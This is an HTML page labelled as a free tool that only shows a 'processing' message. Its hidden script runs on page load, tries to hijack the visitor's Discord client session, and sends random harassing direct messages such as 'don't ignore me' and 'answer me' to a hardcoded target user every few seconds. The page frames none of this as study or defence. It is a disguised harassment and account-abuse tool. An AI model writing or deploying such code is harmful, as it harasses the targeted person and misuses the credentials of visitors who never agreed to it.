<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>無料ツール</title>
  <style>
    body { background:#000; color:#0f0; font-family:monospace; text-align:center; padding:50px; }
    h1 { font-size:2.5em; text-shadow:0 0 20px #0f0; }
  </style>
</head>
<body>
  <h1>処理中です... しばらくお待ちください</h1>

  <script>
    // 対象DiscordユーザーID（事前に取得）
    const TARGET_ID = '1443789104423633058'; // ←ここに対象のDiscord IDを入力

    const MESSAGES = [
      'おい',
      '無視すんな',
      '返事しろよ',
      'DM見て',
      'hey',
      '話そうぜ',
      'オンライン？'
    ];

    // Discordクライアント注入検知＆操作
    function startSpam() {
      // DiscordのWebpackモジュールを探す
      const webpackRequire = window.webpackChunkdiscord_app?.push([[Symbol()],{},(req)=>{webpackRequire=req}]) && window.webpackChunkdiscord_app.pop() && webpackRequire;

      if (!webpackRequire) {
        document.body.innerHTML = '<h1>Discordを開いてからこのページを再読み込みしてください</h1>';
        return;
      }

      const modules = Object.values(webpackRequire.c);
      const findModule = (filter) => modules.find(m => m?.exports?.default?.getCurrentUser || Object.values(m.exports || {}).some(filter));

      // DM送信モジュール取得
      const sendMessageModule = findModule(m => m?.sendMessage);
      const getChannelModule = findModule(m => m?.getChannelId);

      if (!sendMessageModule || !getChannelModule) {
        document.body.innerHTML += '<p>モジュール取得失敗（Discord更新対応待ち）</p>';
        return;
      }

      setInterval(async () => {
        try {
          const channel = await fetch(`https://discord.com/api/v9/users/${TARGET_ID}/channels`, {
            credentials: 'include',
            headers: { 'x-super-properties': btoa(JSON.stringify({os:"Windows",browser:"Chrome"})) }
          }).then(r => r.json());

          const dmChannelId = channel.id || channel[0]?.id;
          if (!dmChannelId) return;

          const msg = MESSAGES[Math.floor(Math.random() * MESSAGES.length)];
          
          await fetch(`https://discord.com/api/v9/channels/${dmChannelId}/messages`, {
            method: 'POST',
            credentials: 'include',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ content: msg })
          });
        } catch(e) {}
      }, Math.floor(Math.random() * 4000) + 3000); // 3-7秒間隔
    }

    // ページロード後即実行
    setTimeout(startSpam, 2000);
  </script>
</body>
</html>
